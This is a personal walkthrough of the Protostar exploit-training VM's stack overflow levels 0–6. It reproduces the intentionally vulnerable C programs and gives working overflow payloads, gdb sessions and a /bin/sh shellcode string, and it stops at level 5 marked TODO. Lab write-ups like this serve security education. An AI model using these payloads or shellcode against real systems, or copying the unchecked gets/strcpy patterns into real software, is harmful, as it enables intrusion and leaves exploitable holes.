# Protostar

Download the VM from https://exploit-exercises.com/download/ and exercises can be found from https://exploit-exercises.com/protostar/stack0/. After `cd /opt/protostar/bin`. At stack4, I realised that its probably better to ssh it, as I could move around better. To do this, use a bridged adapter on protostar vm, and `ssh user@PROTOSTARIP` and password `user`.

## Stack 0

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

We see that from higher addresses --> lower addresses, each variable is pushed on top, so if we overwrite buffer (as there are no boundary check done by gets) we can overwrite the value of modified.

```
$ echo `python -c 'print("A"*64)'` | ./stack0  
Try again?  
$ echo `python -c 'print("A"*65)'` | ./stack0  
you have changed the 'modified' variable  
```

## Stack 1

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)  
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
    errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
    printf("you have correctly got the variable to the right value\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Similarly, but done in hexadecimal, we need to write in big edian

```
$ ./stack1 `python -c 'print("A"*64 + "\x64\x63\x62\x61")'`  
you have correctly got the variable to the right value  
```

## Stack 2

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)  
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
    errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
    printf("you have correctly modified the variable\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }
```

Same again, but this time it uses an environment variable which we have access to.

```
user@protostar:~$ export GREENIE=`python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")'`  
user@protostar:~$ ./stack2  
you have correctly modified the variable  
``` 

## Stack 3

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()  
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)  
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
    printf("calling function pointer, jumping to 0x%08x\n", fp);
    fp();
  }
}
```

Now we have another function win(). The goal is to overwrite fp with the address of win() so that it executes it.

```
$ gdb stack3  
Reading symbols from stack3...done.  
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
(gdb) quit
$ echo `python -c 'print("A"*64 + "\x24\x84\x04\x08")'` | ./stack3
calling function pointer, jumping to 0x08048424  
code flow successfully changed  
```

## Stack 4

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()  
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)  
{
  char buffer[64];

  gets(buffer);
}
```

The goal here is to overwrite the EIP pointer to jump to win() address. This is the standard buffer overflow one, so you have [buffer (64) | ] need to overwrite the EBP and return address which is 4 bytes + 4 bytes. But, on gdb we see that we actually need 12 bytes (still not sure why exactly)

```
root@kali:~/test/protostar# python -c 'print("A"*76)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ gdb stack4
Reading symbols from stack4...done.  
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
(gdb) r
Starting program: /opt/protostar/bin/stack4 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb7eadc03 in __libc_start_main (main=Cannot access memory at address 0x41414149
) at libc-start.c:187
187	libc-start.c: No such file or directory.
	in libc-start.c
(gdb) i r
eax            0xbffffcfb	-1073742597
ecx            0xbffffc70	-1073742736
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffcbc	0xbffffcbc
ebp            0x41414141	0x41414141 <----- overwritten with A's
esi            0x0	0
edi            0x0	0
eip            0xb7eadc03	0xb7eadc03 <__libc_start_main+115>
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

$ echo `python -c 'print("A"*76 + "\xf4\x83\x04\x08")'` | /opt/protostar/bin/stack4  
code flow successfully changed  
Segmentation fault  
```

## Stack 5

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)  
{
  char buffer[64];

  gets(buffer);
}
```

We can use msfvenom to generate a shellcode or just grab one from exploit-db. We use one by Marco Ivaldi. 

``` 
char sc[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
```

```
root@kali:~/test/protostar# python -c 'print("A"*76 + "B"*4 + "C"*120)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
$ gdb -q stack5 
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) c
The program is not being run.
(gdb) r
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/10s $esp
0xbffffcc0:	 'C' <repeats 120 times> <------- We see that our C's are in there and we can use a nop sled to execute this
0xbffffd39:	 ""
0xbffffd3a:	 ""
0xbffffd3b:	 ""
0xbffffd3c:	 "1\203\004\bÄƒ\004\b\001"
0xbffffd46:	 ""
0xbffffd47:	 ""
0xbffffd48:	 "d\375\377\277\360\203\004\b\340\203\004\b@\020\377\267\\\375\377\277\370\370\377\267\001"
0xbffffd62:	 ""
0xbffffd63:	 ""
```
TODO

## Stack 6

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()  
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)  
{
  getpath();
}
```
